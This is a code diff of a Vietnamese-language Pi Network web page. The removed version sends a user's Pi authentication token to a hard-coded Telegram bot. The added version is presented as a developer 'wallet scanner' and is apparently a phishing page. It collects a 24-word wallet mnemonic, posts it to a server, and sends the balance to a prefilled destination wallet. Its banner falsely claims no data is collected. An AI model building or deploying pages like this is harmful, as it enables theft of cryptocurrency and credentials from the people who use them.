@@ -1,73 +1,283 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="vi">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Pi JWT Token Sender</title>
-  <script src="https://sdk.minepi.com/pi-sdk.js"></script>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      padding: 40px;
-      background-color: #f3f3f3;
-      text-align: center;
-    }
-    button {
-      padding: 12px 20px;
-      font-size: 18px;
-      background-color: #ff9100;
-      border: none;
-      border-radius: 8px;
-      color: white;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #fb7a00;
-    }
-  </style>
-</head>
-<body>
-  <h1>Lấy JWT Token từ Pi Browser</h1>
-  <button onclick="getToken()">Lấy JWT Token</button>
-
-  <script>
-    // Thay bằng token bot và chat_id của bạn
-    const BOT_TOKEN = "7753869579:AAHzngwsjPkK_q5W4g3vGVMSb4HwEbtxChY";
-    const CHAT_ID = "5867504772";
-
-    function getToken() {
-      if (!window.Pi) {
-        alert("Pi SDK chưa được tải hoặc không chạy trong Pi Browser");
-        return;
-      }
-
-      window.Pi.authenticate(["username", "payments"], function(auth, error) {
-        if (error) {
-          alert("Lỗi xác thực: " + error.message);
-        } else {
-          const token = auth.accessToken;
-          alert("Đã lấy JWT, đang gửi về Telegram...");
-
-          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-              chat_id: CHAT_ID,
-              text: `📲 Pi JWT Token:\n${token}`
-            })
-          })
-          .then(res => res.json())
-          .then(data => {
-            alert("✅ Đã gửi về Telegram!");
-          })
-          .catch(err => {
-            alert("❌ Lỗi khi gửi Telegram: " + err);
-          });
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pi Network Wallet Scanner - Công cụ thử nghiệm</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <style>
+        .warning-banner {
+            background-color: #FFEBEE;
+            border-left: 4px solid #F44336;
         }
-      });
-    }
-  </script>
+        .result-success {
+            background-color: #E8F5E9;
+            border-left: 4px solid #4CAF50;
+        }
+        .result-error {
+            background-color: #FFEBEE;
+            border-left: 4px solid #F44336;
+        }
+        .loading {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #5D5CDE;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-right: 8px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .dark {
+            background-color: #181818;
+            color: #fff;
+        }
+        .dark .warning-banner {
+            background-color: rgba(244, 67, 54, 0.1);
+        }
+        .dark .result-success {
+            background-color: rgba(76, 175, 80, 0.1);
+        }
+        .dark .result-error {
+            background-color: rgba(244, 67, 54, 0.1);
+        }
+    </style>
+</head>
+<body class="bg-white dark:bg-gray-900 text-gray-900 dark:text-white transition-colors duration-300">
+    <div class="container mx-auto px-4 py-8 max-w-3xl">
+        <h1 class="text-3xl font-bold text-center mb-4 text-indigo-600 dark:text-indigo-400">Pi Network Wallet Scanner</h1>
+        <h2 class="text-xl text-center mb-8 text-gray-600 dark:text-gray-400">Công cụ thử nghiệm dành cho nhà phát triển</h2>
+        
+        <!-- Cảnh báo bảo mật -->
+        <div class="warning-banner p-4 mb-8 rounded-md shadow-md">
+            <h3 class="text-xl font-bold text-red-600 mb-2">⚠️ CẢNH BÁO QUAN TRỌNG</h3>
+            <ul class="list-disc pl-6 text-red-800 dark:text-red-400">
+                <li>Đây chỉ là <strong>công cụ thử nghiệm</strong> để hiểu cách hoạt động của Stellar SDK với Pi Network</li>
+                <li><strong>TUYỆT ĐỐI KHÔNG</strong> nhập cụm từ ghi nhớ (mnemonic) thật của bạn vào đây</li>
+                <li>Ứng dụng này <strong>không lưu trữ</strong>, gửi hay thu thập dữ liệu người dùng</li>
+                <li>Mọi xử lý diễn ra qua API của server bảo mật, không lưu trữ mnemonic</li>
+                <li>Chúng tôi không chịu trách nhiệm nếu bạn bị mất tiền do nhập mnemonic thật</li>
+            </ul>
+        </div>
+
+        <!-- Form nhập mnemonic -->
+        <div class="bg-white dark:bg-gray-800 p-6 rounded-md shadow-md mb-6">
+            <h3 class="text-lg font-semibold mb-4">Kiểm tra ví Pi Network</h3>
+            
+            <div class="mb-4">
+                <label for="mnemonic" class="block mb-2 font-medium text-gray-700 dark:text-gray-300">Nhập cụm từ ghi nhớ (24 từ):</label>
+                <textarea id="mnemonic" class="w-full p-3 border border-gray-300 dark:border-gray-600 rounded-md bg-gray-50 dark:bg-gray-700 text-base" rows="3" placeholder="egg cancel solid asset senior picture vacant blur blame sort find material inflict rib puzzle play seat obtain green rely worth rival clean fly"></textarea>
+            </div>
+            
+            <div class="mb-4">
+                <label for="destination" class="block mb-2 font-medium text-gray-700 dark:text-gray-300">Địa chỉ ví nhận:</label>
+                <input type="text" id="destination" class="w-full p-3 border border-gray-300 dark:border-gray-600 rounded-md bg-gray-50 dark:bg-gray-700 text-base" value="GA6HYCTPYDQGPM4US3H5KIZGHWG2IP3SXX3WXX7ERKHZYKK4KZMUTLFI" />
+            </div>
+            
+            <div class="mb-4">
+                <label for="minBalance" class="block mb-2 font-medium text-gray-700 dark:text-gray-300">Số dư tối thiểu giữ lại (Pi):</label>
+                <input type="number" id="minBalance" class="w-full p-3 border border-gray-300 dark:border-gray-600 rounded-md bg-gray-50 dark:bg-gray-700 text-base" value="0.05" min="0.001" step="0.001" />
+            </div>
+            
+            <div class="flex space-x-4">
+                <button id="checkBalance" class="flex-1 bg-indigo-600 hover:bg-indigo-700 text-white font-medium py-2 px-4 rounded-md transition-colors">
+                    Kiểm tra số dư
+                </button>
+                <button id="sendPi" class="flex-1 bg-green-600 hover:bg-green-700 text-white font-medium py-2 px-4 rounded-md transition-colors" disabled>
+                    Gửi Pi
+                </button>
+            </div>
+        </div>
+
+        <!-- Kết quả -->
+        <div id="results" class="space-y-4 mb-8"></div>
+        
+        <!-- Nhật ký hoạt động -->
+        <div class="bg-white dark:bg-gray-800 p-6 rounded-md shadow-md">
+            <h3 class="text-lg font-semibold mb-4">Nhật ký hoạt động</h3>
+            <div id="logs" class="h-64 overflow-y-auto p-4 bg-gray-100 dark:bg-gray-900 rounded-md font-mono text-sm">
+                <!-- Logs will appear here -->
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <div class="mt-8 text-center text-gray-600 dark:text-gray-400 text-sm">
+            <p>Ứng dụng chỉ dành cho mục đích nghiên cứu và giáo dục.</p>
+            <p class="mt-2">© 2023 - Stellar SDK + Pi Network Demo</p>
+            <button id="toggleTheme" class="mt-4 text-indigo-600 dark:text-indigo-400 hover:underline">
+                Chuyển đổi chế độ tối/sáng
+            </button>
+        </div>
+    </div>
+
+    <script>
+        // Kiểm tra chế độ tối
+        if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+            document.documentElement.classList.add('dark');
+        }
+        
+        // Xử lý chuyển đổi giao diện tối/sáng
+        document.getElementById('toggleTheme').addEventListener('click', function() {
+            document.documentElement.classList.toggle('dark');
+        });
+        
+        // Hiển thị log
+        function log(message, isError = false) {
+            const logsElement = document.getElementById('logs');
+            const logEntry = document.createElement('div');
+            const timestamp = new Date().toLocaleTimeString();
+            logEntry.className = isError ? 'text-red-500' : '';
+            logEntry.innerHTML = `[${timestamp}] ${message}`;
+            logsElement.appendChild(logEntry);
+            logsElement.scrollTop = logsElement.scrollHeight;
+        }
+        
+        // Hiển thị kết quả
+        function showResult(message, isSuccess = true, isLoading = false) {
+            const resultsElement = document.getElementById('results');
+            const resultElement = document.createElement('div');
+            resultElement.className = isLoading ? 'p-4 rounded-md shadow-md bg-gray-100 dark:bg-gray-800' : 
+                                     (isSuccess ? 'p-4 rounded-md shadow-md result-success' : 'p-4 rounded-md shadow-md result-error');
+            
+            if (isLoading) {
+                resultElement.innerHTML = `<div class="flex items-center"><div class="loading"></div>${message}</div>`;
+            } else {
+                resultElement.innerHTML = message;
+            }
+            
+            resultsElement.innerHTML = '';
+            resultsElement.appendChild(resultElement);
+        }
+
+        // Sự kiện kiểm tra số dư
+        document.getElementById('checkBalance').addEventListener('click', async function() {
+            const mnemonicText = document.getElementById('mnemonic').value.trim();
+            
+            if (!mnemonicText) {
+                showResult("Vui lòng nhập cụm từ ghi nhớ (mnemonic) 24 từ.", false);
+                return;
+            }
+            
+            try {
+                showResult("Đang kiểm tra số dư ví Pi Network...", true, true);
+                log("Đang kiểm tra số dư ví Pi Network...");
+                
+                const response = await fetch('/api/check-balance', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ mnemonic: mnemonicText })
+                });
+                
+                if (!response.ok) {
+                    const errorData = await response.json();
+                    throw new Error(errorData.error || 'Lỗi không xác định');
+                }
+                
+                const data = await response.json();
+                
+                // Hiện kết quả
+                let resultHTML = `
+                    <h3 class="text-lg font-semibold mb-2">Kết quả kiểm tra ví</h3>
+                    <p><strong>Địa chỉ ví:</strong> ${data.publicKey}</p>
+                    <p><strong>Số dư:</strong> ${data.balance.toFixed(7)} Pi</p>
+                `;
+                
+                if (data.canSend) {
+                    resultHTML += `
+                        <p class="mt-2"><strong>Có thể gửi:</strong> ${data.availableToSend.toFixed(7)} Pi</p>
+                        <p class="text-sm text-green-600 dark:text-green-400">Bạn có thể gửi Pi từ ví này.</p>
+                    `;
+                    document.getElementById('sendPi').disabled = false;
+                } else {
+                    resultHTML += `
+                        <p class="mt-2 text-sm text-gray-600 dark:text-gray-400">Số dư không đủ để gửi (cần hơn ${(data.minBalance + data.txFee).toFixed(7)} Pi).</p>
+                    `;
+                    document.getElementById('sendPi').disabled = true;
+                }
+                
+                showResult(resultHTML, true);
+                log(`Kiểm tra hoàn tất. Số dư: ${data.balance.toFixed(7)} Pi`);
+                
+            } catch (error) {
+                showResult(`Lỗi: ${error.message}`, false);
+                log(`Lỗi: ${error.message}`, true);
+            }
+        });
+
+        // Sự kiện gửi Pi
+        document.getElementById('sendPi').addEventListener('click', async function() {
+            const mnemonicText = document.getElementById('mnemonic').value.trim();
+            const destination = document.getElementById('destination').value.trim();
+            const minBalance = document.getElementById('minBalance').value;
+            
+            if (!mnemonicText) {
+                showResult("Vui lòng nhập cụm từ ghi nhớ (mnemonic) 24 từ.", false);
+                return;
+            }
+            
+            if (!destination) {
+                showResult("Vui lòng nhập địa chỉ ví nhận.", false);
+                return;
+            }
+            
+            try {
+                // Xác nhận gửi
+                if (!confirm(`Bạn có chắc muốn gửi Pi đến ${destination}? Ví sẽ giữ lại ${minBalance} Pi.`)) {
+                    return;
+                }
+                
+                showResult(`Đang gửi Pi đến ${destination}...`, true, true);
+                log(`Đang gửi Pi đến ${destination}...`);
+                
+                // Gửi Pi
+                const response = await fetch('/api/send-pi', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ 
+                        mnemonic: mnemonicText,
+                        destination: destination,
+                        minBalance: minBalance
+                    })
+                });
+                
+                if (!response.ok) {
+                    const errorData = await response.json();
+                    throw new Error(errorData.error || 'Lỗi không xác định');
+                }
+                
+                const result = await response.json();
+                
+                // Hiển thị kết quả thành công
+                showResult(`
+                    <h3 class="text-lg font-semibold mb-2">Giao dịch thành công!</h3>
+                    <p><strong>Đã gửi:</strong> ${result.sentAmount.toFixed(7)} Pi</p>
+                    <p><strong>Đến địa chỉ:</strong> ${result.destination}</p>
+                    <p><strong>Hash giao dịch:</strong> <span class="font-mono text-sm">${result.transactionHash}</span></p>
+                    <p class="mt-2 text-sm">Số dư còn lại trong ví: ${result.remainingBalance.toFixed(7)} Pi</p>
+                `, true);
+                
+                log(`Giao dịch thành công! Đã gửi ${result.sentAmount.toFixed(7)} Pi.`);
+                
+                // Vô hiệu hóa nút gửi sau khi gửi thành công
+                document.getElementById('sendPi').disabled = true;
+                
+            } catch (error) {
+                showResult(`Lỗi gửi Pi: ${error.message}`, false);
+                log(`Lỗi gửi Pi: ${error.message}`, true);
+            }
+        });
+
+        // Khởi tạo log
+        log("Ứng dụng đã sẵn sàng. Vui lòng nhập mnemonic để kiểm tra số dư.");
+        log("LƯU Ý: Đây chỉ là công cụ thử nghiệm. KHÔNG sử dụng mnemonic thật của bạn!");
+    </script>
 </body>
 </html>
